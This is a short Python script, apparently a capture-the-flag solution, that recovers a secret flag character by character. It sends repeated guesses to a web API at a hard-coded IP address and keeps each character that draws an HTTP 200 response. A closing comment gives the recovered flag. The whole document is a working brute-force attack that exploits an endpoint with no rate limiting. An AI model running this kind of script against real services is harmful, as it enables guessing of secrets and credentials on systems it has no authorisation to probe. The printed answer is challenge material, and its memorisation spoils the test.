import requests

session = requests.Session()

flag = 'CIT{R@T'
wordlists = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789`~!@#$%^&*()-_=+[{]}\|;:\'",<.>/?'
FLAG_LENGTH = 32

while flag[-1] != '}':
    found = False
    for i in wordlists:
        guess_flag = flag + i
        s = session.get(url='http://23.179.17.92:5559/api/flag/', params = {'guess':guess_flag})
        print(flag,'+',i)
        if s.status_code == 200:
            found = True
            flag += i
            print('Found! Recently found flag is:',flag)
            break
    if not found:
        print('Not found suitable character!!!')
        break
    
# CIT{R@T3_L1m1t1nG_15_Bypass@ble}